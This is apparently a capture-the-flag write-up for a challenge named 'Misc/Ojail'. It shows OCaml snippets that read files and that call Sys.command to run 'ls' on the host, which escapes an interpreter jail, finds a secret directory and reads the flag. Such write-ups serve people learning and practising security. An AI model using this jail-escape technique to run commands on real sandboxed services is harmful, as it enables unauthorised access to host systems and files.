# Misc/Ojail

![Untitled](Misc%20Ojail/Untitled.png)

I didn’t hear of Ocaml before, so googling was preliminary.

I later discovered it’s a functional programming language.

![Untitled](Misc%20Ojail/Untitled%201.png)

i google a lot and played a bit with the interface.

I found a function that permits to read a file from a filepath:

```python
let read_file filepath =
  let channel = open_in filepath in
  let rec read_lines lines =
    try
      let line = input_line channel in
      read_lines (line :: lines)
    with
      End_of_file ->
        close_in channel;
        List.rev lines
  in
  read_lines [];;

let content = read_file "flag.txt";;
```

I was able to read flag.txt but it was a fake flag unfortunately

![Untitled](Misc%20Ojail/Untitled%202.png)

I later found a Sys module that’s supposed to let me execute linux commands on the host. 

```python
let cmd = Sys.command "ls";;
print_endline ("Command exit status: " ^ string_of_int cmd);;
```

![Untitled](Misc%20Ojail/Untitled%203.png)

That was exactly what i needed, i dicovered the secret directory found the filename of the flag.

```python
let cmd = Sys.command "ls ./secret";;
print_endline ("Command exit status: " ^ string_of_int cmd);;
```

![Untitled](Misc%20Ojail/Untitled%204.png)

Using the previously declared function i’m able to read the flag.

```python
let content = read_file "./secret/flag-1d573e0faa99.json";;
```

![Untitled](Misc%20Ojail/Untitled%205.png)

Made By Fckroun with <3